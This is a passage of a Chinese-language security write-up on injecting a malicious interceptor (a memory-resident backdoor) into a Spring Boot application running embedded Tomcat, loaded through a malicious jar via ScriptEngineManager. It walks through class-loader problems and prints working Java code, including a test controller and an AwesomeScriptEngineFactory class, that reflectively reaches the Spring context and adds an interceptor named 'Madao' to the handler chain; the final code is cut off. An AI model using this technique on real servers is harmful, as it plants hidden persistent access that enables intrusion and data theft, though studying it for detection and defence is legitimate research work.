        java-object-searcher
        0.1.0
找到的链大致如下：
而在测试线程时刚好看到在进入恶意jar包时线程上下文的 ClassLoader 为
`TomcatEmbeddedWebappClassLoader`，即内嵌TomcatClassLoader：  
在往下翻几层：
可以看到 `contextClassLoader.resources.context.context` 是一个眼熟的类，把它取出来看看：
发现attributes里又保存了个眼熟的值，把`org.springframework.web.context.WebApplicationContext.ROOT`取出来：
发现刚好是个 `BeanFactory`，打印所有Bean：
发现跟从 `WebApplicationContext`中取出的 Bean 一模一样，其中也保存了requestMappingHandlerMapping
，
那么我们可以从当前线程获取到这个变量，然后再取出 requestMappingHandlerMapping 绑定的 Bean不就能达到一样的效果了吗？
先写个控制器试一下：
    package code.landgrey.controller;
    import org.apache.catalina.Context;
    import org.apache.catalina.core.ApplicationContext;
    import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
    import org.springframework.boot.context.embedded.tomcat.TomcatEmbeddedWebappClassLoader;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RestController;
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
    import java.lang.reflect.Field;
    @RestController
    @EnableAutoConfiguration
    public class TomcatInject {
        @RequestMapping("/tomcat")
        public String tomcat() throws Exception{
            // 取出内嵌tomcat上下文
            Context tomcatEmbeddedContext = ((TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader()).getResources().getContext();
            // TomcatEmbeddedContext非公共类，反射取出私有属性context
            Field contextField = StandardContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) contextField.get(tomcatEmbeddedContext);
            // 以下类似
            WebApplicationContext context = (WebApplicationContext)applicationContext.getAttribute("org.springframework.web.context.WebApplicationContext.ROOT");
            RequestMappingHandlerMapping abstractHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList adaptedInterceptors = (java.util.ArrayList) field.get(abstractHandlerMapping);
            // 防止重复注册
            for (Object i : adaptedInterceptors) {
                if (i.getClass().getName().contains("Madao")) {
                    return "ok";
                }
            }
            //实例化恶意拦截器并注册
            adaptedInterceptors.add(Class.forName("artsploit.Madao").newInstance());
            return "success";
        }
    }
访问 :  
已成功注入：
正当我再次满怀期待的打好jar包测试时，现实又给了我当头一棒：
两个一模一样的类告诉我不能强制转换，这下给我整不会了。
#### 3.3 全限定名类转换报错
查阅相关资料后，发现原来是 JVM 的规范引起的：
    JVM判断两个类对象是否相同的依据:一是类全称;一个是类加载器。
而我们在创建 ScriptEngineManger时，是新建了一个 URLClassLoader 实例加载我们的 jar 包，因此jar包里的依赖都是由
新的 URLClassLoader 加载的，而非主线程的URLClassLoader：
这也解释了之前找不到依赖的原因。
为了解决这个bug，首先想到的是全部用反射调用方法和属性，花了好大功夫才一步步整出来下面这个畸形的类，其中艰辛不再细说：
    package artsploit;
    import javax.script.ScriptEngine;
    import javax.script.ScriptEngineFactory;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.List;
    public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
        public AwesomeScriptEngineFactory() {
            try {
                // 从当前线程取出上下文，适用于多线程情况 -> 会报错，还是反射调用吧
                // Context tomcatEmbeddedContext = ((TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader()).getResources().getContext();
                ClassLoader tomcatClassLoader = Thread.currentThread().getContextClassLoader();
                Method getResources = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getMethod("getResources");
                Object resources = getResources.invoke(tomcatClassLoader);
                Method getContext = getResources.invoke(tomcatClassLoader).getClass().getMethod("getContext");
                Object tomcatEmbeddedContext = (Object) getContext.invoke(resources);
                // 取出 ApplicationContext
                Field contextField = getContext.invoke(resources).getClass().getSuperclass().getDeclaredField("context");
                contextField.setAccessible(true);
                Object applicationContext = (Object) contextField.get(tomcatEmbeddedContext);
                Method getAttribute = contextField.get(tomcatEmbeddedContext).getClass().getMethod("getAttribute", String.class);
                Object webApplicationContext = (Object) getAttribute.invoke(applicationContext, "org.springframework.web.context.WebApplicationContext.ROOT");
                Class abstractApplicationContext = getAttribute.invoke(applicationContext, "org.springframework.web.context.WebApplicationContext.ROOT").getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                Method getBean = abstractApplicationContext.getMethod("getBean", String.class);
                Method getBeanDefinitionNames =abstractApplicationContext.getMethod("getBeanDefinitionNames");
                // 测试输出所有 Bean
                Object[] result = (Object[]) getBeanDefinitionNames.invoke(webApplicationContext);
                for(Object r:result){
                    System.out.println(r.toString());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public String getEngineName() {
            return null;
        }
        public String getEngineVersion() {
            return null;
        }
        public List getExtensions() {
            return null;
        }
        public List getMimeTypes() {
            return null;
        }
        public List getNames() {
            return null;
        }
        public String getLanguageName() {
            return null;
        }
        public String getLanguageVersion() {
            return null;
        }
        public Object getParameter(String key) {
            return null;
        }
        public String getMethodCallSyntax(String obj, String m, String... args) {
            return null;
        }
        public String getOutputStatement(String toDisplay) {
            return null;
        }
        public String getProgram(String... statements) {
            return null;
        }
        public ScriptEngine getScriptEngine() {
            return null;
        }
    }
测试输出所有绑定的 Bean ：
此时胜利的曙光仿佛就在眼前，取出拦截器列表后插入一个恶意类：
    Method getBean = abstractApplicationContext.getMethod("getBean", String.class);
                // 单例模式
                Object abstractHandlerMapping = getBean.invoke(webApplicationContext, "requestMappingHandlerMapping");
                // 反射获取adaptedInterceptors属性
                Field field = getBean.invoke(webApplicationContext, "requestMappingHandlerMapping").getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adaptedInterceptors");
                field.setAccessible(true);
                java.util.ArrayList adaptedInterceptors = (java.util.ArrayList) field.get(abstractHandlerMapping);
                for (Object i : adaptedInterceptors) {
                    if (i.getClass().getName().contains("Madao")) {
                        return;
                    }
                }
                adaptedInterceptors.add(new Madao());
                System.out.println("1ok");
直接访问并未报错：
然而。。。
正如前文提到的，加载jar包的类加载器与主线程的不一致，故我们写的恶意拦截器不能强制转换为主线程中的拦截器类，因此报错，难道只能这样就结束了吗？
### 4\. 最终
重新查看当前线程的内嵌tomcat加载器：
注意到这个父加载器，取出来看看：
发现它刚好就是我们主线程的加载器，那么我们可以先获取到这个主加载器，再用它加载我们的 `Madao` 拦截器不就可以了吗，用此思路，顺便将核心代码封装为
`Evil`类，利用子线程的ClassLoader加载，再在
`Evil`类中获取主加载器，加载我们的`Madao`插入拦截器中。这样不用引入任何依赖，jar包体积也缩小至几KB，最终代码如下：
`AwesomeScriptEngineFactory.class`：